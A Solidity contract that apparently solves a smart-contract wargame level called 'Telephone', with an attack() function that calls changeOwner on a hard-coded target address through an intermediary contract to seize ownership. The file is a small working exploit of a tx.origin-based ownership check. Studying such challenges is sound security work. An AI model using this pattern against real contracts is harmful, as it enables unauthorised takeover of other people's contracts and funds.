// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

// import '../lib/forge-std/src/Script.sol';

interface ITelephone {
  function owner() external view returns (address);
  function changeOwner(address _owner) external;
}

contract TelephoneScript {
  ITelephone target = ITelephone(0x3577Fa037e6f6298c0D36ae9263e7E23E981c446);

  function attack() external {
    target.changeOwner(0xA36ACa10170185F663C804f36e69D6BA0C62CED5);
  }
}
